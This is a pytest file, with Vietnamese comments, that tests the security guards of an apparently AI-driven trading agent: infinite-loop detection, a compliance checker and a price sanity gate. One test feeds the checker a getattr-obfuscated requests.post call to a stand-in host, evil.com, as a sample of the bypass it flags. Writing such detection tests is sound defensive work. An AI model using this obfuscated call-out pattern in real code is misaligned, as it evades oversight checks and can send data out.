import pytest
import ast
import os
from pathlib import Path
from core.mental_sandbox import MentalSandbox
from tools.system.compliance_checker import ComplianceChecker
from projects.ai_trading_agent.src.validation_gate import validation_gate

# --- [TEST VULN-001: MentalSandbox Logic Check] ---
def test_sandbox_infinite_loop_detection():
    """Verify MentalSandbox detects and blocks infinite loops."""
    root = Path(__file__).resolve().parent.parent
    sandbox = MentalSandbox(root)
    
    # Kịch bản tấn công: Vòng lặp vô hạn không có break
    bad_code = """
def attack():
    while True:
        pass
"""
    draft_path = sandbox.sandbox_dir / "attack_loop.py"
    draft_path.parent.mkdir(parents=True, exist_ok=True)
    with open(draft_path, "w", encoding="utf-8") as f:
        f.write(bad_code)
    
    # Phải trả về False do vi phạm logic
    is_safe = sandbox.verify_syntax(draft_path)
    
    assert is_safe is False, "Sandbox should block infinite loops"
    sandbox.cleanup()

# --- [TEST VULN-002: Compliance Checker Advanced Detection] ---
def test_compliance_bypass_detection():
    """Verify ComplianceChecker detects getattr bypass and forbidden imports."""
    root = Path(__file__).resolve().parent.parent
    checker = ComplianceChecker(root)
    
    # 1. Test getattr bypass
    bypass_code = "getattr(requests, 'post')(url='http://evil.com')"
    tree = ast.parse(bypass_code)
    checker.violations = []
    test_path = root / "test_agent.py"
    checker._check_dangerous_nodes(tree, test_path, is_agent=True)
    
    assert any(v["type"] == "DYNAMIC_CALL_BYPASS" for v in checker.violations)
    
    # 2. Test forbidden import
    import_code = "import httpx"
    tree = ast.parse(import_code)
    checker.violations = []
    checker._check_dangerous_nodes(tree, test_path, is_agent=True)
    
    assert any(v["type"] == "FORBIDDEN_IMPORT" for v in checker.violations)

# --- [TEST VULN-003: Database Integrity Sanity Check] ---
def test_data_integrity_sanity_check():
    """Verify ValidationGate rejects insane prices."""
    # Giá BTC bình thường
    assert validation_gate.check_data_integrity("BTC-USD", 65000.0) is True
    
    # Giá BTC ảo (Chaos Overlord attack)
    assert validation_gate.check_data_integrity("BTC-USD", 1000000.0) is False
    
    # Giá BTC quá thấp
    assert validation_gate.check_data_integrity("BTC-USD", 1000.0) is False

if __name__ == "__main__":
    pytest.main([__file__])
